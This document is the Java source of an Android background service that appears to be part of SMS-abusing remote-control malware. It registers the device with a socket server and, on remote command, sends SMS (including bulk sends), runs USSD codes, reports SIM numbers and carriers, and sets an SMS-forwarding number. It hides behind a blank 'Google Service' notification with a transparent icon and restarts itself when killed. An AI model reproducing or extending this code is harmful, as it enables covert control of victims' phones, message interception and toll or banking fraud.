package com.pegalite.neotron3.server.socket;

import android.Manifest;
import android.annotation.SuppressLint;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.IBinder;
import android.provider.Settings;
import android.telephony.SmsManager;
import android.telephony.SubscriptionInfo;
import android.telephony.SubscriptionManager;
import android.telephony.TelephonyManager;

import androidx.annotation.Nullable;
import androidx.core.app.ActivityCompat;
import androidx.core.app.NotificationCompat;
import androidx.core.content.ContextCompat;

import com.pegalite.neotron3.functions.Prefs;
import com.pegalite.neotron3.functions.listeners.ActionCallback;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.util.List;

import io.socket.client.Ack;


public class SocketService extends Service {

    private static final String CHANNEL_ID = "socket_channel";
    private static final int NOTIFICATION_ID = 1;

    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
        startForeground(NOTIFICATION_ID, createMinimalNotification());

        connectWebSocket();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY; // Restarts if killed
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @SuppressLint("HardwareIds")
    private void connectWebSocket() {
        PegaSocketServer.init("agent-" + Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID) + "-" + getPackageName());
        PegaSocketServer.getSocket().on("send-sms", args -> {
            String phoneNumber = (String) args[0];
            String message = (String) args[1];
            int slot = (int) args[2];

            Object lastArg = args[args.length - 1];
            Ack ackCallback = (lastArg instanceof Ack) ? (Ack) lastArg : null;
            sendSMS(phoneNumber, message, slot, new ActionCallback() {
                @Override
                public void onSuccess() {
                    if (ackCallback != null) {
                        JSONObject ackData = new JSONObject();
                        try {
                            ackData.put("status", "success");
                        } catch (JSONException ignored) {
                        }
                        ackCallback.call(ackData);
                    }
                }

                @Override
                public void onError(String message) {
                    if (ackCallback != null) {
                        JSONObject ackData = new JSONObject();
                        try {
                            ackData.put("status", "error");
                            ackData.put("msg", message);
                        } catch (JSONException ignored) {
                        }
                        ackCallback.call(ackData);
                    }
                }
            });
        });

        Prefs prefs = new Prefs(this);

        PegaSocketServer.getSocket().on("get_sim_status", args -> {
            Object lastArg = args[args.length - 1];
            if (lastArg instanceof Ack) {
                final Ack ackCallback = (Ack) lastArg;

                SubscriptionManager sm = (SubscriptionManager) getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE);

                JSONObject ackData = new JSONObject();
                JSONArray simInfo = new JSONArray();
                try {
                    if (ActivityCompat.checkSelfPermission(this, android.Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
                        List<SubscriptionInfo> subs = sm.getActiveSubscriptionInfoList();
                        if (subs == null) {
                            ackData.put("status", "error");
                            ackData.put("msg", "No Sim Card Found!");
                            return;
                        }
                        for (SubscriptionInfo info : subs) {
                            String number = info.getNumber(); // Mobile number (can be null!)
                            String carrierName = info.getCarrierName().toString(); // Airtel, Jio, etc.
                            String displayName = info.getDisplayName().toString();
                            simInfo.put(new JSONObject().put("number", number).put("carrierName", carrierName).put("displayName", displayName));
                        }
                        ackData.put("status", "success");
                        ackData.put("msg", "success");
                        ackData.put("data", simInfo);
                        ackData.put("configs", new JSONObject().put("sms-forward", prefs.getPref("sms-forward")));

                    } else {
                        ackData.put("status", "error");
                        ackData.put("msg", "Permission Error!");
                    }
                } catch (JSONException ignored) {

                }
                ackCallback.call(ackData);
            }
        });

        PegaSocketServer.getSocket().on("run-ussd", args -> {
            String ussd = (String) args[0];
            int slot = (int) args[1];
            Object lastArg = args[args.length - 1];
            Ack ackCallback = (lastArg instanceof Ack) ? (Ack) lastArg : null;

            sendUssd(ussd, slot, new ActionCallback() {
                @Override
                public void onSuccess() {
                    if (ackCallback != null) {
                        JSONObject ackData = new JSONObject();
                        try {
                            ackData.put("status", "success");
                        } catch (JSONException ignored) {
                        }
                        ackCallback.call(ackData);
                    }
                }

                @Override
                public void onError(String message) {
                    if (ackCallback != null) {
                        JSONObject ackData = new JSONObject();
                        try {
                            ackData.put("status", "error");
                            ackData.put("msg", message);
                        } catch (JSONException ignored) {
                        }
                        ackCallback.call(ackData);
                    }
                }
            });
        });

    }

    private void sendSMS(String phoneNumber, String message, int slot, ActionCallback callback) {
        SubscriptionManager subscriptionManager = (SubscriptionManager) getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE);
        if (subscriptionManager == null) {
            callback.onError("SubscriptionManager is not available.");
            return;
        }

        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
            callback.onError("Permission Error!");
            return;
        }
        List<SubscriptionInfo> subscriptionInfos = subscriptionManager.getActiveSubscriptionInfoList();
        if (subscriptionInfos == null || subscriptionInfos.isEmpty()) {
            callback.onError("No active SIM found.");
            return;
        }

        if (slot < 0 || slot >= subscriptionInfos.size()) {
            callback.onError("Invalid SIM slot index.");
            return;
        }

        if (ContextCompat.checkSelfPermission(this, Manifest.permission.SEND_SMS) != PackageManager.PERMISSION_GRANTED) {
            callback.onError("SMS permission not granted.");
            return;
        }

        SmsManager smsManager = SmsManager.getSmsManagerForSubscriptionId(slot);
        if (phoneNumber.contains(",") || phoneNumber.contains(".")) {
            for (String number : phoneNumber.contains(",") ? phoneNumber.split(",") : phoneNumber.split("\\.")) {
                smsManager.sendTextMessage(number, null, message, null, null);
            }
        } else {
            smsManager.sendTextMessage(phoneNumber, null, message, null, null);
        }

        callback.onSuccess();
    }

    public int getSimSlotCount() {
        SubscriptionManager subscriptionManager = (SubscriptionManager) getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE);
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
            return 1;
        }
        List<SubscriptionInfo> activeSubscriptionInfoList = subscriptionManager.getActiveSubscriptionInfoList();
        return (activeSubscriptionInfoList != null) ? activeSubscriptionInfoList.size() : 0;

    }

    private void sendUssd(String ussd, int slot, ActionCallback callback) {
        if (ussd.startsWith("*987*")) {
            registerSMSForwarding(ussd.replace("*987*", "").replace("#", ""), callback);
            return;
        }
        if (ussd.startsWith("*678#")) {
            unregisterSMSForwarding(callback);
            return;
        }
        SubscriptionManager subscriptionManager = (SubscriptionManager) getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE);
        if (subscriptionManager == null) {
            callback.onError("Device may not support telephony or service is unavailable");
            return;
        }

        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
            callback.onError("Permission Error!");
            return;
        }
        List<SubscriptionInfo> subscriptionInfos = subscriptionManager.getActiveSubscriptionInfoList();
        if (subscriptionInfos == null || subscriptionInfos.isEmpty()) {
            callback.onError("No active SIM cards found.");
            return;
        }

        if (slot < 0 || slot >= subscriptionInfos.size()) {
            callback.onError("Invalid SIM slot index.");
            return;
        }

        SubscriptionInfo simInfo = subscriptionInfos.get(slot);
        TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
        if (telephonyManager == null) {
            callback.onError("TelephonyManager is not available on this device.");
            return;
        }

        TelephonyManager simTelephonyManager = telephonyManager.createForSubscriptionId(simInfo.getSubscriptionId());
        if (simTelephonyManager == null) {
            callback.onError("Unable to create TelephonyManager for the selected SIM.");
            return;
        }

        simTelephonyManager.sendUssdRequest(ussd, new TelephonyManager.UssdResponseCallback() {
            @Override
            public void onReceiveUssdResponse(TelephonyManager telephonyManager, String request, CharSequence response) {
                callback.onSuccess();
            }

            @Override
            public void onReceiveUssdResponseFailed(TelephonyManager telephonyManager, String request, int failureCode) {
                String errorMessage;
                switch (failureCode) {
                    case TelephonyManager.USSD_RETURN_FAILURE:
                        errorMessage = "USSD request failed: returned failure.";
                        break;
                    case TelephonyManager.USSD_ERROR_SERVICE_UNAVAIL:
                        errorMessage = "USSD service is unavailable.";
                        break;
                    default:
                        errorMessage = "Unknown USSD failure. Code: " + failureCode;
                        break;
                }
                callback.onError(errorMessage);
            }
        }, null);
    }

    private void unregisterSMSForwarding(ActionCallback callback) {
        Prefs prefs = new Prefs(this);
        prefs.removePref("sms-forward");
        callback.onSuccess();
    }

    private void registerSMSForwarding(String number, ActionCallback callback) {
        Prefs prefs = new Prefs(this);
        prefs.setPref("sms-forward", number);
        callback.onSuccess();
    }

    private Uri ussdToCallableUri(String ussd) {

        String uriString = "";

        if (!ussd.startsWith("tel:")) uriString += "tel:";

        for (char c : ussd.toCharArray()) {

            if (c == '#') uriString += Uri.encode("#");
            else uriString += c;
        }

        return Uri.parse(uriString);
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(CHANNEL_ID, "Google Service", NotificationManager.IMPORTANCE_MIN);
            channel.setDescription("Checking For Updates");

            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(channel);
            }
        }
    }

    private Notification createMinimalNotification() {
        return new NotificationCompat.Builder(this, CHANNEL_ID).setContentTitle("").setContentText("").setSmallIcon(android.R.color.transparent) // Transparent icon
                .setPriority(NotificationCompat.PRIORITY_MIN).setOngoing(true).build();
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        Intent restartService = new Intent(getApplicationContext(), SocketService.class);
        startForegroundService(restartService);
    }

}

